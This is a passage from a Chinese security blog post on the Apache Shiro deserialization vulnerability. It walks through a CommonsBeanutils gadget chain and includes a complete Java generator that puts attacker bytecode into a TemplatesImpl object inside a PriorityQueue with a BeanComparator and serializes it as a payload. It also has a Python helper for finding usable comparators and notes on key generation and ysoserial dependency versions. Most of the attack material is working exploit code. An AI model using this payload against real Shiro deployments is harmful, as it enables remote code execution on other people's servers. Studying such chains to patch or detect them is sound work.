+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115124713204.png"><br>这里的Compare是可以利用的<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125654628.png"><br>回忆之前的CC2里的优先队列里用到的Compare<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125934644.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130145666.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130232812.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130334270.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130402005.png"><br>回到CC2<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130523583.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130651736.png"></p>
+<p>链：通过CC2的优先队列找到Compare 且优先队列的值也是可以控制的<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115130848555.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.OutputPropertyUtils;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroCB</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line"><span class="comment">//CC3  </span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">byte</span> [] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/patrik/Desktop/tmp/Test.class&quot;</span>));  </span><br><span class="line"><span class="type">byte</span> [][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodesField.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//CB  </span></span><br><span class="line"><span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//CC2  </span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">  </span><br><span class="line">priorityQueue.add(templates);  </span><br><span class="line">priorityQueue.add(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">Class&lt;PriorityQueue&gt; c = PriorityQueue.class;  </span><br><span class="line"><span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);  </span><br><span class="line">comparatorField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">comparatorField.set(priorityQueue, beanComparator);  </span><br><span class="line">  </span><br><span class="line">serialize(priorityQueue);  </span><br><span class="line"><span class="comment">//unserialize(&quot;ser.bin&quot;);  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span> <span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line"><span class="keyword">return</span> obj;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115142654347.png"><br>生成密钥<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143039757.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143159203.png"></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="补充1-CB默认依赖CC依赖的问题"><a href="#补充1-CB默认依赖CC依赖的问题" class="headerlink" title="补充1:CB默认依赖CC依赖的问题"></a>补充1:CB默认依赖CC依赖的问题</h3><p>没打成功看日志发现CC下的ComparableComparator<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144508222.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144719277.png"><br>BeanComparator在构造时传入了ComparableComparator<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144850501.png"><br>用到了CC里的依赖 而CB没有<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115145000272.png"><br>解决：ComparableComparator的另一个构造函数 可以自己传一个CB或JDK里有的comparator即可<br>即需同时继承Comparator接口和Serializable接口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;comparator.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	data = f.readline()</span><br><span class="line">	coms = []</span><br><span class="line">	<span class="keyword">while</span> data:</span><br><span class="line">		coms.append(data)</span><br><span class="line">		data = f.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;serializable.txt&#x27;</span>) <span class="keyword">as</span> d:</span><br><span class="line">	data = d.readline()</span><br><span class="line">	sers = []</span><br><span class="line">	<span class="keyword">while</span> data:</span><br><span class="line">		sers.append(data)</span><br><span class="line">		data = d.readline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(*[i <span class="keyword">for</span> i <span class="keyword">in</span> coms <span class="keyword">if</span> i <span class="keyword">in</span> sers])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115150009491.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115150045066.png"><br>添加即可</p>
+<h3 id="补充2-用ysoserial打-依赖库版本不同报错"><a href="#补充2-用ysoserial打-依赖库版本不同报错" class="headerlink" title="补充2:用ysoserial打 依赖库版本不同报错"></a>补充2:用ysoserial打 依赖库版本不同报错</h3><p>ysoserial的CB依赖版本<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115143859811.png"><br>环境本身的CB依赖<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144005508.png"><br>CB依赖版本不一致导致报错<br>因事先指定版本与环境版本一致 所以能打成功<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115144128303.png"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">下载源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2tomcat"><span class="toc-number">1.2.</span> <span class="toc-text">部署tomcat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie"><span class="toc-number">2.1.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">静态分析源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDK%E5%86%85%E7%BD%AE%E9%93%BE%E6%89%93%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">JDK内置链打法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8CC%E9%93%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">为什么不用CC链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">3.1.2.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9B%BF%E6%8D%A2%E5%AF%86%E9%92%A5"><span class="toc-number">3.1.3.</span> <span class="toc-text">生成替换密钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.4.</span> <span class="toc-text">动态分析源码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E9%93%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">CC链的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CB%E9%93%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">CB链的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">4.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%851-CB%E9%BB%98%E8%AE%A4%E4%BE%9D%E8%B5%96CC%E4%BE%9D%E8%B5%96%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">补充1:CB默认依赖CC依赖的问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%852-%E7%94%A8ysoserial%E6%89%93-%E4%BE%9D%E8%B5%96%E5%BA%93%E7%89%88%E6%9C%AC%E4%B8%8D%E5%90%8C%E6%8A%A5%E9%94%99"><span class="toc-number">4.2.</span> <span class="toc-text">补充2:用ysoserial打 依赖库版本不同报错</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/950ba293.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/950ba293.html&text=Shiro反序列化漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/950ba293.html&is_video=false&description=Shiro反序列化漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro反序列化漏洞&body=Check out this article: http://byesec.com/posts/950ba293.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/950ba293.html&title=Shiro反序列化漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/950ba293.html&name=Shiro反序列化漏洞&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/950ba293.html&t=Shiro反序列化漏洞"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    patrik
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'byesec/blog_utteranc';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
